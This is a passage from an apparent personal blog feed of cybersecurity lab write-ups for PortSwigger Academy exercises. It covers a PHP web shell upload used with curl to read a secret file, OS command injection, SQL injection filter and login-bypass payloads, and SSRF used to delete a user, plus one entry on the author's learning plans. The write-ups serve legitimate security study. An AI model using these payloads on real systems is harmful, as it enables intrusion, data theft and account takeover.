  1f1 - Remote code execution via web shell upload [PortSwigger Lab]
  &lt;a href=&#34;#1f1---remote-code-execution-via-web-shell-upload-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;This lab contains a vulnerable image upload function. It doesn&amp;rsquo;t perform any validation on the files users upload before storing them on the server&amp;rsquo;s filesystem.&lt;/p&gt;
&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;
  &lt;strong&gt;Solution:&lt;/strong&gt;
  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;So this application has an unprotected upload field in user page where you can upload profile avatar.&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719131804.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;From there, I effectively uploaded a file named &lt;code&gt;mal.php&lt;/code&gt; with contents &lt;code&gt;&amp;lt;?php echo system($_GET[&#39;command&#39;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;once upload was done, I had to know where the file was uploaded so I could call it. Inspecting avatar link gave me the clue. &lt;code&gt;&amp;lt;img src=&amp;quot;/files/avatars/mal.php&amp;quot; class=&amp;quot;avatar&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;so I opened up terminal and called the &lt;code&gt;mal.php&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$&amp;gt; curl -X GET &amp;#34;https://0a9000000490ee47800ead51001f0062.web-security-academy.net/files/avatars/mal.php?command=pwd&amp;#34;

/var/www/html/avatars
/var/www/html/avatars&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now I know I&amp;rsquo;m at &lt;code&gt;/var/www/html/avatars&lt;/code&gt;. So to read the contents of the &lt;code&gt;secrets&lt;/code&gt; file, all I have to do is a simple [[2 - Portswigger Academy#Path Traversal |Path Traversal]]&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$&amp;gt; curl -X GET &amp;#34;https://0a9000000490ee47800ead51001f0062.web-security-academy.net/files/avatars/mal.php?command=cat%20../../../../home/carlos/secret&amp;#34;

U4AE****************************U4AE****************************&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Keep in mind this method repeats the message twice, so I had to remove the second part of message.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;secret&lt;/code&gt; contents:&lt;code&gt;`U4AE****************************&#39;&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Most of the times, FOV will not be this easy. There will be defense mechanisms in place, but it doesn&amp;rsquo;t mean they are robust. They can still be exploited by finding flaws in these defense mechanisms.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Flawed file type validation When submitting HTML forms, the browser sends this data in POST request with content type &lt;code&gt;application/x-www-form-url-encoded&lt;/code&gt;. This is fine for textual data, but for larger amounts of binary data like PDF or images, content type &lt;code&gt;multipard/form-data&lt;/code&gt; is preferred.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Consider the following example of form upload with image field, description and username&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /images HTTP/1.1 
Host: normal-website.com 
Content-Length: 12345 
Content-Type: multipart/form-data; 
boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 
Content-Disposition: form-data; 
name=&amp;#34;image&amp;#34;; 
filename=&amp;#34;example.jpg&amp;#34; 
Content-Type: image/jpeg 
[...binary content of example.jpg...] 
---------------------------012345678901234567890123456 
Content-Disposition: form-data; 
name=&amp;#34;description&amp;#34; This is an interesting description of my image. ---------------------------012345678901234567890123456 
Content-Disposition: form-data; 
name=&amp;#34;username&amp;#34; wiener ---------------------------012345678901234567890123456--&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see Content-Type, filename, binary data and other interesting information about this form in here.&lt;/p&gt;
&lt;p&gt;One way that a website might validate uploaded file, is to check the input-specific &lt;code&gt;Content-Type&lt;/code&gt; if it matches expected file type. if it only expects &lt;code&gt;image/png&lt;/code&gt; it will only allow PNG. It could become problematic if the server trusts this header for what a file is and doesn&amp;rsquo;t perform further validation on the file, whether the file itself matches its description. this defense can be bypassed a tool like BurpSuite.&lt;/p&gt;
</content>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/archive/notetaking-and-random-stuff/thoughts-about-my-cybersec-journey/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/notetaking-and-random-stuff/thoughts-about-my-cybersec-journey/</guid>
      <description>&lt;h1 id=&#34;0a---thoughts-about-my-cybersec-journey&#34;&gt;
  0a - Thoughts about my Cybersec Journey
  &lt;a href=&#34;#0a---thoughts-about-my-cybersec-journey&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Over the years, I have explored diverse disciplines within computer science. My interests have spanned programming, operating systems, and the intricacies of Unix and Windows systems. I delved into game development, experimenting with various engines and libraries, resulting in several completed and unfinished projects that provided valuable experience. Amateur 3D modeling with Blender further broadened my skill set. I consistently engage with technical content, including CS/IT conference recordings. My formal training includes CSIRT and Threat Hunting, and I currently hold a CCNA certification. More recently, I have developed an interest in hardware hacking and IoT, though my electronics knowledge is currently limited. This breadth of experience has provided me with a foundation of knowledge that I believe is sufficient for specializing in any area of cybersecurity.&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;0a---thoughts-about-my-cybersec-journey&#34;&gt;
  0a - Thoughts about my Cybersec Journey
  &lt;a href=&#34;#0a---thoughts-about-my-cybersec-journey&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Over the years, I have explored diverse disciplines within computer science. My interests have spanned programming, operating systems, and the intricacies of Unix and Windows systems. I delved into game development, experimenting with various engines and libraries, resulting in several completed and unfinished projects that provided valuable experience. Amateur 3D modeling with Blender further broadened my skill set. I consistently engage with technical content, including CS/IT conference recordings. My formal training includes CSIRT and Threat Hunting, and I currently hold a CCNA certification. More recently, I have developed an interest in hardware hacking and IoT, though my electronics knowledge is currently limited. This breadth of experience has provided me with a foundation of knowledge that I believe is sufficient for specializing in any area of cybersecurity.&lt;/p&gt;
&lt;p&gt;Specifically, in the next period I&amp;rsquo;d like to improve in the following sub-disciplines(although not necessarily in this order):&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Reverse Engineering&lt;/li&gt;
&lt;li&gt;Bug Bounty&lt;/li&gt;
&lt;li&gt;Penetration Testing&lt;/li&gt;
&lt;li&gt;SOC Analysis(maybe)&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;observations&#34;&gt;
  Observations
  &lt;a href=&#34;#observations&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;date: Sat 22:51 10AUG2024&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I have observed that theoretical learning, such as through passive reading or didactic courses (e.g., HackTheBox Academy lessons), yields minimal practical knowledge retention. Conversely, hands-on experience, gained through practical challenges and labs (e.g., Portswigger Academy, HackTheBox Labs, bug bounty programs), significantly enhances knowledge retention and application. Therefore, I will prioritize practical challenges and adopt a just-in-time learning approach, acquiring knowledge as needed to effectively retain and apply the information.&lt;/p&gt;
</content>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/archive/raw-notes-command-injection/1d1-os-command-injection-simple-case-portswigger-lab/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/raw-notes-command-injection/1d1-os-command-injection-simple-case-portswigger-lab/</guid>
      <description>&lt;h1 id=&#34;1d1---os-command-injection-simple-case-portswigger-lab&#34;&gt;
  1d1 - OS command injection, simple case [PortSwigger Lab]
  &lt;a href=&#34;#1d1---os-command-injection-simple-case-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;This lab contains an OS command injection vulnerability in the product stock checker.&lt;/p&gt;
&lt;p&gt;The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.&lt;/p&gt;
&lt;p&gt;To solve the lab, execute the &lt;code&gt;whoami&lt;/code&gt; command to determine the name of the current user.&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;
  Solution:
  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;So we got the application url &lt;code&gt;https://0a1a008c030d74ae82cb6698003a004a.web-security-academy.net/&lt;/code&gt;&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;1d1---os-command-injection-simple-case-portswigger-lab&#34;&gt;
  1d1 - OS command injection, simple case [PortSwigger Lab]
  &lt;a href=&#34;#1d1---os-command-injection-simple-case-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;This lab contains an OS command injection vulnerability in the product stock checker.&lt;/p&gt;
&lt;p&gt;The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.&lt;/p&gt;
&lt;p&gt;To solve the lab, execute the &lt;code&gt;whoami&lt;/code&gt; command to determine the name of the current user.&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;
  Solution:
  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;So we got the application url &lt;code&gt;https://0a1a008c030d74ae82cb6698003a004a.web-security-academy.net/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Once again, it has a product page where &amp;lsquo;Check stock&amp;rsquo; function is implemented.&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719175357.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;By checking HTPP request made by that button is as follows&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /product/stock HTTP/2
Host: 0a1a008c030d74ae82cb6698003a004a.web-security-academy.net
Cookie: session=SMwTtluydKMmnOH4phL6G00iGAwD2J9Q
Content-Length: 21
Sec-Ch-Ua: &amp;#34;Not/A)Brand&amp;#34;;v=&amp;#34;8&amp;#34;, &amp;#34;Chromium&amp;#34;;v=&amp;#34;126&amp;#34;
Sec-Ch-Ua-Platform: &amp;#34;Windows&amp;#34;
Accept-Language: en-US
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a1a008c030d74ae82cb6698003a004a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1a008c030d74ae82cb6698003a004a.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

productId=2&amp;amp;storeId=1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;on the bottom we got &lt;code&gt;productId=2&amp;amp;storeId=1&lt;/code&gt; which makes a request to an API with these parameters.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s change productID argument to &lt;code&gt;&amp;amp; echo hello &amp;amp;&lt;/code&gt; but with url encoding enabled&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719183331.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;This request gives out the following output ![[Pasted image 20240719183415.png]] although it resulted in error, now we know the username &lt;code&gt;peter-3vyaW3&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;or the second way &lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719183446.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;which yields the same response:&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719183502.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;hr&gt;
</content>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/archive/raw-notes-sqli/1e1-sql-injection-vulnerability-allowing-retrieval-of-hidden-data-portswigger-lab/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/raw-notes-sqli/1e1-sql-injection-vulnerability-allowing-retrieval-of-hidden-data-portswigger-lab/</guid>
      <description>&lt;h1 id=&#34;1e1---sql-injection-vulnerability-allowing-retrieval-of-hidden-data-portswigger-lab&#34;&gt;
  1e1 - SQL injection vulnerability allowing retrieval of hidden data [PortSwigger Lab]
  &lt;a href=&#34;#1e1---sql-injection-vulnerability-allowing-retrieval-of-hidden-data-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;1e1---sql-injection-vulnerability-allowing-retrieval-of-hidden-data-portswigger-lab&#34;&gt;
  1e1 - SQL injection vulnerability allowing retrieval of hidden data [PortSwigger Lab]
  &lt;a href=&#34;#1e1---sql-injection-vulnerability-allowing-retrieval-of-hidden-data-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;
  Solution:
  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719185908.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;So taking this application into BurpSuite and selecting a category &amp;ldquo;Pets&amp;rdquo; gives me the following request&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GET /filter?category=Pets HTTP/2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;So what should I inject here to cause the following SQL query to malfunction?&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT * FROM products WHERE category = &#39;Pets&#39; AND released = 1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;So basically, modifying the original &lt;code&gt;GET /filter?category=Pets HTTP/2&lt;/code&gt; to &lt;code&gt;GET /filter?category=Pets&#39;+OR+1=1--&#39; HTTP/2&lt;/code&gt; causes to perform the following SQL query&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT * FROM products WHERE category = &#39;Pets&#39; OR 1=1-- AND released = 1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;meaning that everything will be displayed since &lt;code&gt;1=1&lt;/code&gt; is TRUE and after that everything is ignored.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Imagine another scenario where an application lets user submit their credentials &lt;code&gt;wiener:peter&lt;/code&gt;. SQL query might look like this&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT * FROM users WHERE username = &#39;wiener&#39; AND password = &#39;bluecheese&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;if the query returns the details the login was seccessful. otherwise, it rejected.&lt;/p&gt;
&lt;p&gt;an attacker might be able to login as any user without the need for a password. this can be done using &lt;code&gt;--&lt;/code&gt; sequence in &lt;code&gt;WHERE&lt;/code&gt; clause where password is checked. for example submitting the username &lt;code&gt;wiener&#39;--&lt;/code&gt; would produce the following SQL query&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT * FROM users WHERE username = &#39;wiener&#39;--&#39; AND password = &#39;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;successfully logging in a user.&lt;/p&gt;
</content>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/archive/raw-notes-sqli/1e2-sql-injection-vulnerability-allowing-login-bypass-portswigger-lab/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/raw-notes-sqli/1e2-sql-injection-vulnerability-allowing-login-bypass-portswigger-lab/</guid>
      <description>&lt;h1 id=&#34;1e2---sql-injection-vulnerability-allowing-login-bypass-portswigger-lab&#34;&gt;
  1e2 - SQL injection vulnerability allowing login bypass [PortSwigger Lab]
  &lt;a href=&#34;#1e2---sql-injection-vulnerability-allowing-login-bypass-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;This lab contains a SQL injection vulnerability in the login function.&lt;/p&gt;
&lt;p&gt;To solve the lab, perform a SQL injection attack that logs in to the application as the &lt;code&gt;administrator&lt;/code&gt; user.&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;
  Solution:
  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;So basically moving to login page and making a request with random credentials e.g &lt;code&gt;administrator:1234&lt;/code&gt; produces the following request&lt;/p&gt;
&lt;p&gt;&lt;code&gt;csrf=fa4Q5v3cgV1j8b53G5zEr6Q45BQUFKfA&amp;amp;username=administrator&amp;amp;password=1234&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;all we need to do is add &lt;code&gt;&#39;--&lt;/code&gt; after administrator. which successfully lets us in as an administrator.&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;1e2---sql-injection-vulnerability-allowing-login-bypass-portswigger-lab&#34;&gt;
  1e2 - SQL injection vulnerability allowing login bypass [PortSwigger Lab]
  &lt;a href=&#34;#1e2---sql-injection-vulnerability-allowing-login-bypass-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;This lab contains a SQL injection vulnerability in the login function.&lt;/p&gt;
&lt;p&gt;To solve the lab, perform a SQL injection attack that logs in to the application as the &lt;code&gt;administrator&lt;/code&gt; user.&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;
  Solution:
  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;So basically moving to login page and making a request with random credentials e.g &lt;code&gt;administrator:1234&lt;/code&gt; produces the following request&lt;/p&gt;
&lt;p&gt;&lt;code&gt;csrf=fa4Q5v3cgV1j8b53G5zEr6Q45BQUFKfA&amp;amp;username=administrator&amp;amp;password=1234&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;all we need to do is add &lt;code&gt;&#39;--&lt;/code&gt; after administrator. which successfully lets us in as an administrator.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;I&amp;rsquo;ve solved around 20 PortSwigger labs at the time of writing. So the things I&amp;rsquo;ve further learned is mainly related to BurpSuite. so having a good knowledge of that is essential.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ve got a fairly good grasp of Access Control vulnerabilities at this point.&lt;/p&gt;
</content>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/archive/raw-notes-ssrf/1c1-ssrf-against-local-interface-portswigger-lab/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/raw-notes-ssrf/1c1-ssrf-against-local-interface-portswigger-lab/</guid>
      <description>&lt;h1 id=&#34;1c1---ssrf-against-local-interface-portswigger-lab&#34;&gt;
  1c1 - SSRF against local interface [Portswigger Lab]
  &lt;a href=&#34;#1c1---ssrf-against-local-interface-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;h3 id=&#34;problem&#34;&gt;
  &lt;strong&gt;Problem&lt;/strong&gt;
  &lt;a href=&#34;#problem&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at`http://localhost/admin`and delete the user`carlos`.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;URL: &lt;a href=&#34;https://0a4f00b403f04c6c8165a70d000b0073.web-security-academy.net/&#34;&gt;https://0a4f00b403f04c6c8165a70d000b0073.web-security-academy.net/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;
  Solution
  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;So each product page has a functionality to check stock for an item. Clicking &amp;ldquo;Check stock&amp;rdquo; displays number of items in stock&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;1c1---ssrf-against-local-interface-portswigger-lab&#34;&gt;
  1c1 - SSRF against local interface [Portswigger Lab]
  &lt;a href=&#34;#1c1---ssrf-against-local-interface-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;h3 id=&#34;problem&#34;&gt;
  &lt;strong&gt;Problem&lt;/strong&gt;
  &lt;a href=&#34;#problem&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at`http://localhost/admin`and delete the user`carlos`.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;URL: &lt;a href=&#34;https://0a4f00b403f04c6c8165a70d000b0073.web-security-academy.net/&#34;&gt;https://0a4f00b403f04c6c8165a70d000b0073.web-security-academy.net/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;
  Solution
  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;So each product page has a functionality to check stock for an item. Clicking &amp;ldquo;Check stock&amp;rdquo; displays number of items in stock&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240718170709.png&#34; alt=&#34;Check Stock functionality&#34;  /&gt;
  &lt;/figure&gt;

&lt;p&gt;Upon checking in BurpSuite, the application makes an API call to some &lt;code&gt;stockApi&lt;/code&gt; URL &lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240718170830.png&#34; alt=&#34;BurpSuite - API call for stock check&#34;  /&gt;
  &lt;/figure&gt;

&lt;p&gt;Changing a &lt;code&gt;stockApi&lt;/code&gt; URL to a &lt;code&gt;loopback&lt;/code&gt; URL such as &lt;code&gt;http://localhost/admin&lt;/code&gt; and then sending a request causes the web application to return an admin interface instead of number of stock items.&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240718170954.png&#34; alt=&#34;admin interface returned&#34;  /&gt;
  &lt;/figure&gt;

&lt;p&gt;Pointing to User &lt;code&gt;delete&lt;/code&gt; link points to &lt;code&gt;https://0a4f00b403f04c6c8165a70d000b0073.web-security-academy.net/admin/delete?username=wiener&lt;/code&gt;, so if we modify the HTTP request once again to &lt;code&gt;stockApi=http://localhost/admin/delete?username=wiener&lt;/code&gt; it will make a &lt;code&gt;SSRF&lt;/code&gt; call against the local server and issue a command to delete an user &amp;lsquo;wiener&amp;rsquo;&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240718171429.png&#34; alt=&#34;removing user weiner&#34;  /&gt;
  &lt;/figure&gt;

</content>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/archive/raw-notes-ssrf/1c2-ssrf-against-external-back-end-system-portswigger-lab/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/raw-notes-ssrf/1c2-ssrf-against-external-back-end-system-portswigger-lab/</guid>
      <description>&lt;h1 id=&#34;1c2---ssrf-against-external-back-end-system-portswigger-lab&#34;&gt;
  1c2 - SSRF against external back-end system [PortSwigger Lab]
  &lt;a href=&#34;#1c2---ssrf-against-external-back-end-system-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;The same principle applies for remote SSRF. An attacker can submit the following request to access the admin interface&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


